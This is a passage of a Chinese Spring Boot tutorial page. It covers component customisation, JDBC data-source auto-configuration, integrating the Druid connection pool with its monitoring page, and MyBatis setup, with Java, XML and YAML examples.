server.setPort(<span class="hljs-number">9000</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="59、定制化原理-SpringBoot定制化组件的几种方式（小结）"><a href="#59、定制化原理-SpringBoot定制化组件的几种方式（小结）" class="headerlink" title="59、定制化原理-SpringBoot定制化组件的几种方式（小结）"></a>59、定制化原理-SpringBoot定制化组件的几种方式（小结）</h2><h3 id="定制化的常见方式"><a href="#定制化的常见方式" class="headerlink" title="定制化的常见方式"></a>定制化的常见方式</h3><ul><li><p>修改配置文件</p></li><li><p><code>xxxxxCustomizer</code></p></li><li><p>编写自定义的配置类  <code>xxxConfiguration</code> + <code>@Bean</code>替换、增加容器中默认组件，视图解析器</p></li><li><p>Web应用 编写一个配置类实现 <code>WebMvcConfigurer</code> 即可定制化web功能 + <code>@Bean</code>给容器中再扩展一些组件</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AdminWebConfig</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">WebMvcConfigurer</span>&#123;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>@EnableWebMvc</code> + <code>WebMvcConfigurer</code> — <code>@Bean</code>  可以全面接管SpringMVC，所有规则全部自己重新配置； 实现定制和扩展功能（<strong>高级功能，初学者退避三舍</strong>）。<ul><li>原理：<ol><li><code>WebMvcAutoConfiguration</code>默认的SpringMVC的自动配置功能类，如静态资源、欢迎页等。</li><li>一旦使用 <code>@EnableWebMvc</code> ，会<code>@Import(DelegatingWebMvcConfiguration.class)</code>。</li><li><code>DelegatingWebMvcConfiguration</code>的作用，只保证SpringMVC最基本的使用<ul><li>把所有系统中的<code>WebMvcConfigurer</code>拿过来，所有功能的定制都是这些<code>WebMvcConfigurer</code>合起来一起生效。</li><li>自动配置了一些非常底层的组件，如<code>RequestMappingHandlerMapping</code>，这些组件依赖的组件都是从容器中获取如。</li><li><code>public class DelegatingWebMvcConfiguration extends WebMvcConfigurationSupport</code>。</li></ul></li><li><code>WebMvcAutoConfiguration</code>里面的配置要能生效必须  <code>@ConditionalOnMissingBean(WebMvcConfigurationSupport.class)</code>。</li><li>@EnableWebMvc 导致了WebMvcAutoConfiguration  没有生效。</li></ol></li></ul></li></ul><h3 id="原理分析套路"><a href="#原理分析套路" class="headerlink" title="原理分析套路"></a>原理分析套路</h3><p>场景starter - <code>xxxxAutoConfiguration</code> - 导入xxx组件 - 绑定<code>xxxProperties</code> - 绑定配置文件项。</p><h2 id="60、数据访问-数据库场景的自动配置分析与整合测试"><a href="#60、数据访问-数据库场景的自动配置分析与整合测试" class="headerlink" title="60、数据访问-数据库场景的自动配置分析与整合测试"></a>60、数据访问-数据库场景的自动配置分析与整合测试</h2><h3 id="导入JDBC场景"><a href="#导入JDBC场景" class="headerlink" title="导入JDBC场景"></a>导入JDBC场景</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-data-jdbc<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>接着导入数据库驱动包（MySQL为例）。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--默认版本：--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">mysql.version</span>&gt;</span>8.0.22<span class="hljs-tag">&lt;/<span class="hljs-name">mysql.version</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--&lt;version&gt;5.1.49&lt;/version&gt;--&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-comment">&lt;!--</span><br><span class="hljs-comment">想要修改版本</span><br><span class="hljs-comment">1、直接依赖引入具体版本（maven的就近依赖原则）</span><br><span class="hljs-comment">2、重新声明版本（maven的属性的就近优先原则）</span><br><span class="hljs-comment">--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">java.version</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">java.version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">mysql.version</span>&gt;</span>5.1.49<span class="hljs-tag">&lt;/<span class="hljs-name">mysql.version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="相关数据源配置类"><a href="#相关数据源配置类" class="headerlink" title="相关数据源配置类"></a>相关数据源配置类</h3><ul><li><p><code>DataSourceAutoConfiguration</code> ： 数据源的自动配置。</p><ul><li>修改数据源相关的配置：<code>spring.datasource</code>。</li><li><strong>数据库连接池的配置，是自己容器中没有DataSource才自动配置的</strong>。</li><li>底层配置好的连接池是：<code>HikariDataSource</code>。</li></ul></li><li><p><code>DataSourceTransactionManagerAutoConfiguration</code>： 事务管理器的自动配置。</p></li><li><p><code>JdbcTemplateAutoConfiguration</code>： <code>JdbcTemplate</code>的自动配置，可以来对数据库进行CRUD。</p><ul><li>可以修改前缀为<code>spring.jdbc</code>的配置项来修改<code>JdbcTemplate</code>。</li><li><code>@Bean @Primary JdbcTemplate</code>：Spring容器中有这个<code>JdbcTemplate</code>组件，使用<code>@Autowired</code>。</li></ul></li><li><p><code>JndiDataSourceAutoConfiguration</code>： JNDI的自动配置。</p></li><li><p><code>XADataSourceAutoConfiguration</code>： 分布式事务相关的。</p></li></ul><h3 id="修改配置项"><a href="#修改配置项" class="headerlink" title="修改配置项"></a>修改配置项</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">datasource:</span><br>    <span class="hljs-attr">url:</span> <span class="hljs-string">jdbc:mysql://localhost:3306/db_account</span><br>    <span class="hljs-attr">username:</span> <span class="hljs-string">root</span><br>    <span class="hljs-attr">password:</span> <span class="hljs-number">123456</span><br>    <span class="hljs-attr">driver-class-name:</span> <span class="hljs-string">com.mysql.jdbc.Driver</span><br></code></pre></td></tr></table></figure><h3 id="单元测试数据源"><a href="#单元测试数据源" class="headerlink" title="单元测试数据源"></a>单元测试数据源</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.junit.jupiter.api.Test;<br><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;<br><span class="hljs-keyword">import</span> org.springframework.boot.test.context.SpringBootTest;<br><span class="hljs-keyword">import</span> org.springframework.jdbc.core.JdbcTemplate;<br><br><span class="hljs-meta">@SpringBootTest</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Boot05WebAdminApplicationTests</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    JdbcTemplate jdbcTemplate;<br><br>    <span class="hljs-meta">@Test</span><span class="hljs-comment">//用@org.junit.Test会报空指针异常，可能跟JUnit新版本有关</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">contextLoads</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-comment">//        jdbcTemplate.queryForObject(&quot;select * from account_tbl&quot;)</span><br><span class="hljs-comment">//        jdbcTemplate.queryForList(&quot;select * from account_tbl&quot;,)</span><br>        <span class="hljs-type">Long</span> <span class="hljs-variable">aLong</span> <span class="hljs-operator">=</span> jdbcTemplate.queryForObject(<span class="hljs-string">&quot;select count(*) from account_tbl&quot;</span>, Long.class);<br>        log.info(<span class="hljs-string">&quot;记录总数：&#123;&#125;&quot;</span>,aLong);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="61、数据访问-自定义方式整合druid数据源"><a href="#61、数据访问-自定义方式整合druid数据源" class="headerlink" title="61、数据访问-自定义方式整合druid数据源"></a>61、数据访问-自定义方式整合druid数据源</h2><p><a href="https://github.com/alibaba/druid">Druid官网</a></p><h3 id="Druid是什么？"><a href="#Druid是什么？" class="headerlink" title="Druid是什么？"></a>Druid是什么？</h3><p>它是数据库连接池，它能够提供强大的监控和扩展功能。</p><p><a href="https://github.com/alibaba/druid/wiki/Druid%E8%BF%9E%E6%8E%A5%E6%B1%A0%E4%BB%8B%E7%BB%8D">官方文档 - Druid连接池介绍</a></p><p>Spring Boot整合第三方技术的两种方式：</p><ul><li><p>自定义</p></li><li><p>找starter场景</p></li></ul><h3 id="自定义方式"><a href="#自定义方式" class="headerlink" title="自定义方式"></a>自定义方式</h3><p><strong>添加依赖</strong>：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>druid<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1.17<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>配置Druid数据源</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyConfig</span> &#123;<br><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-meta">@ConfigurationProperties(&quot;spring.datasource&quot;)</span><span class="hljs-comment">//复用配置文件的数据源配置</span><br>    <span class="hljs-keyword">public</span> DataSource <span class="hljs-title function_">dataSource</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>        <span class="hljs-type">DruidDataSource</span> <span class="hljs-variable">druidDataSource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DruidDataSource</span>();<br><br><span class="hljs-comment">//        druidDataSource.setUrl();</span><br><span class="hljs-comment">//        druidDataSource.setUsername();</span><br><span class="hljs-comment">//        druidDataSource.setPassword();</span><br><br>        <span class="hljs-keyword">return</span> druidDataSource;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a href="https://github.com/alibaba/druid/wiki/DruidDataSource%E9%85%8D%E7%BD%AE">更多配置项</a></p><p><strong>配置Druid的监控页功能</strong>：</p><ul><li><p>Druid内置提供了一个<code>StatViewServlet</code>用于展示Druid的统计信息。<a href="https://github.com/alibaba/druid/wiki/%E9%85%8D%E7%BD%AE_StatViewServlet%E9%85%8D%E7%BD%AE">官方文档 - 配置_StatViewServlet配置</a>。这个<code>StatViewServlet</code>的用途包括：</p><ul><li>提供监控信息展示的html页面</li><li>提供监控信息的JSON API</li></ul></li><li><p>Druid内置提供一个<code>StatFilter</code>，用于统计监控信息。<a href="https://github.com/alibaba/druid/wiki/%E9%85%8D%E7%BD%AE_StatFilter">官方文档 - 配置_StatFilter</a></p></li><li><p><code>WebStatFilter</code>用于采集web-jdbc关联监控的数据，如SQL监控、URI监控。<a href="https://github.com/alibaba/druid/wiki/%E9%85%8D%E7%BD%AE_%E9%85%8D%E7%BD%AEWebStatFilter">官方文档 - 配置_配置WebStatFilter</a></p></li><li><p>Druid提供了<code>WallFilter</code>，它是基于SQL语义分析来实现防御SQL注入攻击的。<a href="https://github.com/alibaba/druid/wiki/%E9%85%8D%E7%BD%AE-wallfilter">官方文档 - 配置 wallfilter</a></p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyConfig</span> &#123;<br><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-meta">@ConfigurationProperties(&quot;spring.datasource&quot;)</span><br>    <span class="hljs-keyword">public</span> DataSource <span class="hljs-title function_">dataSource</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>        <span class="hljs-type">DruidDataSource</span> <span class="hljs-variable">druidDataSource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DruidDataSource</span>();<br><br>        <span class="hljs-comment">//加入监控和防火墙功能功能</span><br>        druidDataSource.setFilters(<span class="hljs-string">&quot;stat,wall&quot;</span>);<br>        <br>        <span class="hljs-keyword">return</span> druidDataSource;<br>    &#125;<br>    <br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 配置 druid的监控页功能</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> ServletRegistrationBean <span class="hljs-title function_">statViewServlet</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">StatViewServlet</span> <span class="hljs-variable">statViewServlet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StatViewServlet</span>();<br>        ServletRegistrationBean&lt;StatViewServlet&gt; registrationBean = <br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletRegistrationBean</span>&lt;&gt;(statViewServlet, <span class="hljs-string">&quot;/druid/*&quot;</span>);<br><br>        <span class="hljs-comment">//监控页账号密码：</span><br>        registrationBean.addInitParameter(<span class="hljs-string">&quot;loginUsername&quot;</span>,<span class="hljs-string">&quot;admin&quot;</span>);<br>        registrationBean.addInitParameter(<span class="hljs-string">&quot;loginPassword&quot;</span>,<span class="hljs-string">&quot;123456&quot;</span>);<br><br>        <span class="hljs-keyword">return</span> registrationBean;<br>    &#125;<br>    <br>     <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * WebStatFilter 用于采集web-jdbc关联监控的数据。</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> FilterRegistrationBean <span class="hljs-title function_">webStatFilter</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">WebStatFilter</span> <span class="hljs-variable">webStatFilter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebStatFilter</span>();<br><br>        FilterRegistrationBean&lt;WebStatFilter&gt; filterRegistrationBean = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterRegistrationBean</span>&lt;&gt;(webStatFilter);<br>        filterRegistrationBean.setUrlPatterns(Arrays.asList(<span class="hljs-string">&quot;/*&quot;</span>));<br>        filterRegistrationBean.addInitParameter(<span class="hljs-string">&quot;exclusions&quot;</span>,<span class="hljs-string">&quot;*.js,*.gif,*.jpg,*.png,*.css,*.ico,/druid/*&quot;</span>);<br><br>        <span class="hljs-keyword">return</span> filterRegistrationBean;<br>    &#125;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="62、数据访问-druid数据源starter整合方式"><a href="#62、数据访问-druid数据源starter整合方式" class="headerlink" title="62、数据访问-druid数据源starter整合方式"></a>62、数据访问-druid数据源starter整合方式</h2><p><a href="">官方文档 - Druid Spring Boot Starter</a></p><p><strong>引入依赖</strong>：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>druid-spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1.17<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>分析自动配置</strong>：</p><ul><li>扩展配置项 <code>spring.datasource.druid</code></li><li>自动配置类<code>DruidDataSourceAutoConfigure</code></li><li><code>DruidSpringAopConfiguration.class</code>,  监控SpringBean的；配置项：<code>spring.datasource.druid.aop-patterns</code></li><li><code>DruidStatViewServletConfiguration.class</code>, 监控页的配置。<code>spring.datasource.druid.stat-view-servlet</code>默认开启。</li><li><code>DruidWebStatFilterConfiguration.class</code>，web监控配置。<code>spring.datasource.druid.web-stat-filter</code>默认开启。</li><li><code>DruidFilterConfiguration.class</code>所有Druid的filter的配置：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FILTER_STAT_PREFIX</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;spring.datasource.druid.filter.stat&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FILTER_CONFIG_PREFIX</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;spring.datasource.druid.filter.config&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FILTER_ENCODING_PREFIX</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;spring.datasource.druid.filter.encoding&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FILTER_SLF4J_PREFIX</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;spring.datasource.druid.filter.slf4j&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FILTER_LOG4J_PREFIX</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;spring.datasource.druid.filter.log4j&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FILTER_LOG4J2_PREFIX</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;spring.datasource.druid.filter.log4j2&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FILTER_COMMONS_LOG_PREFIX</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;spring.datasource.druid.filter.commons-log&quot;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FILTER_WALL_PREFIX</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;spring.datasource.druid.filter.wall&quot;</span>;<br></code></pre></td></tr></table></figure><p><strong>配置示例</strong>：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">datasource:</span><br>    <span class="hljs-attr">url:</span> <span class="hljs-string">jdbc:mysql://localhost:3306/db_account</span><br>    <span class="hljs-attr">username:</span> <span class="hljs-string">root</span><br>    <span class="hljs-attr">password:</span> <span class="hljs-number">123456</span><br>    <span class="hljs-attr">driver-class-name:</span> <span class="hljs-string">com.mysql.jdbc.Driver</span><br><br>    <span class="hljs-attr">druid:</span><br>      <span class="hljs-attr">aop-patterns:</span> <span class="hljs-string">com.atguigu.admin.*</span>  <span class="hljs-comment">#监控SpringBean</span><br>      <span class="hljs-attr">filters:</span> <span class="hljs-string">stat,wall</span>     <span class="hljs-comment"># 底层开启功能，stat（sql监控），wall（防火墙）</span><br><br>      <span class="hljs-attr">stat-view-servlet:</span>   <span class="hljs-comment"># 配置监控页功能</span><br>        <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span><br>        <span class="hljs-attr">login-username:</span> <span class="hljs-string">admin</span><br>        <span class="hljs-attr">login-password:</span> <span class="hljs-string">admin</span><br>        <span class="hljs-attr">resetEnable:</span> <span class="hljs-literal">false</span><br><br>      <span class="hljs-attr">web-stat-filter:</span>  <span class="hljs-comment"># 监控web</span><br>        <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span><br>        <span class="hljs-attr">urlPattern:</span> <span class="hljs-string">/*</span><br>        <span class="hljs-attr">exclusions:</span> <span class="hljs-string">&#x27;*.js,*.gif,*.jpg,*.png,*.css,*.ico,/druid/*&#x27;</span><br><br><br>      <span class="hljs-attr">filter:</span><br>        <span class="hljs-attr">stat:</span>    <span class="hljs-comment"># 对上面filters里面的stat的详细配置</span><br>          <span class="hljs-attr">slow-sql-millis:</span> <span class="hljs-number">1000</span><br>          <span class="hljs-attr">logSlowSql:</span> <span class="hljs-literal">true</span><br>          <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span><br>        <span class="hljs-attr">wall:</span><br>          <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span><br>          <span class="hljs-attr">config:</span><br>            <span class="hljs-attr">drop-table-allow:</span> <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><h2 id="63、数据访问-整合MyBatis-配置版"><a href="#63、数据访问-整合MyBatis-配置版" class="headerlink" title="63、数据访问-整合MyBatis-配置版"></a>63、数据访问-整合MyBatis-配置版</h2><p><a href="https://github.com/mybatis">MyBatis的GitHub仓库</a></p><p><a href="https://mybatis.org/mybatis-3/zh/index.html">MyBatis官方</a></p><p><strong>starter的命名方式</strong>：</p><ol><li>SpringBoot官方的Starter：<code>spring-boot-starter-*</code></li><li>第三方的： <code>*-spring-boot-starter</code></li></ol><p><strong>引入依赖</strong>：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.1.4<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>配置模式</strong>:</p><ul><li><p>全局配置文件</p></li><li><p><code>SqlSessionFactory</code>：自动配置好了</p></li><li><p><code>SqlSession</code>：自动配置了<code>SqlSessionTemplate</code> 组合了<code>SqlSession</code></p></li><li><p><code>@Import(AutoConfiguredMapperScannerRegistrar.class)</code></p></li><li><p><code>Mapper</code>： 只要我们写的操作MyBatis的接口标准了<code>@Mapper</code>就会被自动扫描进来</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@EnableConfigurationProperties(MybatisProperties.class)</span> ： MyBatis配置项绑定类。<br><span class="hljs-meta">@AutoConfigureAfter(&#123; DataSourceAutoConfiguration.class, MybatisLanguageDriverAutoConfiguration.class &#125;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MybatisAutoConfiguration</span>&#123;<br>    ...<br>&#125;<br><br><span class="hljs-meta">@ConfigurationProperties(prefix = &quot;mybatis&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MybatisProperties</span>&#123;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><hr><p><strong>配置文件</strong>：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">datasource:</span><br>    <span class="hljs-attr">username:</span> <span class="hljs-string">root</span><br>    <span class="hljs-attr">password:</span> <span class="hljs-number">1234</span><br>    <span class="hljs-attr">url:</span> <span class="hljs-string">jdbc:mysql://localhost:3306/my</span><br>    <span class="hljs-attr">driver-class-name:</span> <span 